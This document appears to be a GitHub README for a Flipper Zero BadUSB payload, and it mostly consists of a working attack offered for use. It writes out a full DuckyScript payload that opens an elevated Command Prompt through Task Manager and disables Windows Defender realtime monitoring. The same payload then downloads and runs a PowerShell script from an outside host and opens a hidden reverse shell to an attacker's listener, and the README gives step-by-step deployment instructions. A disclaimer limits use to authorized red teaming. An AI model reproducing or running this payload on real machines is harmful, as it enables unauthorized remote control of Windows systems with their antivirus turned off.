# Admin Reverse Shell Payload for Flipper Zero

Author: [SoggyCow](https://github.com/SoggyCow)  
License: MIT

## Overview

This script launches an elevated Command Prompt via Task Manager, disables Windows Defender Realtime Monitoring, and executes a hidden PowerShell reverse shell using `Invoke-ConPtyShell`. Designed for adversarial testing and red team operations, it leverages Flipper Zero’s **BadUSB** feature with DuckyScript for deployment via HID emulation.

## Features

- Opens an elevated Command Prompt through Task Manager.
- Disables Windows Defender Realtime Monitoring.
- Initiates a hidden PowerShell reverse shell.
- Modular design for tactical use.

## Configuration

Before deployment, replace the following placeholders in the payload:
- `[LISTENER_IP_ADDRESS]`: IP address of your Netcat listener.
- `[PORT]`: Port number for the reverse shell connection.

## Usage

### 1. Save the Payload
- Filename: `reverse_shell.txt`
- Format: UTF-8 plain text
- Example payload:
  ```ducky
  REM Title: Admin Reverse Shell Payload
  REM Author: SoggyCow
  REM Description: Opens elevated CMD via Task Manager, disables Windows Defender, and runs hidden PowerShell reverse shell
  DELAY 1000
  GUI t
  DELAY 500
  STRING taskmgr
  CTRL-SHIFT ENTER
  DELAY 1500
  STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR 'https://ps1.soggycow.com/remote-access/Invoke-ConPtyShell.ps1' -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]
  ENTER
  ```

### 2. Upload to Flipper
- Connect Flipper Zero via USB or Bluetooth.
- Use **qFlipper** or **Flipper Mobile App**.
- Transfer to: `SD Card/badusb/`.

### 3. Deploy on Target Machine
- On Flipper: Navigate to `Main Menu > Bad USB > reverse_shell.txt`.
- Ensure USB mode is active.
- Connect to the target Windows machine and press **Run**.

The script will:
- Open Task Manager (`Win + T`).
- Launch an elevated Command Prompt (`taskmgr` with `CTRL + SHIFT + ENTER`).
- Execute PowerShell commands to disable Windows Defender and start the reverse shell.

## Requirements

- **OS**: Windows 10/11
- **Flipper Zero**: BadUSB feature enabled
- **Internet Access**: Required to download `Invoke-ConPtyShell.ps1`
- **Admin Privileges**: Needed for Command Prompt elevation and Defender modifications
- **Netcat Listener**: Configured on `[LISTENER_IP_ADDRESS]` and `[PORT]`
- **Command Prompt/PowerShell**: Must support the specified commands

## Technical Notes

- **Elevation**: Triggers an elevated Command Prompt via Task Manager; may prompt UAC.
- **Windows Defender**: Disables Realtime Monitoring using `Set-MpPreference`.
- **Reverse Shell**: Utilizes `Invoke-ConPtyShell` for a stable, interactive shell.
- **Delays**: Uses `DELAY 1000`, `DELAY 500`, and `DELAY 1500`. Adjust for slower systems (e.g., `DELAY 700+`).
- **Testing**: Validate in a virtual machine or sandbox to ensure functionality.
- **Security**: Downloads a remote script from `https://ps1.soggycow.com/remote-access/Invoke-ConPtyShell.ps1`. Verify the source before deployment.

## Disclaimer

This script is for **educational and authorized red team purposes only**. Use only on systems you own or have explicit permission to access. The author, SoggyCow, is not liable for misuse, damage, or legal consequences.

## License

Licensed under the MIT License. See the `LICENSE` file for details.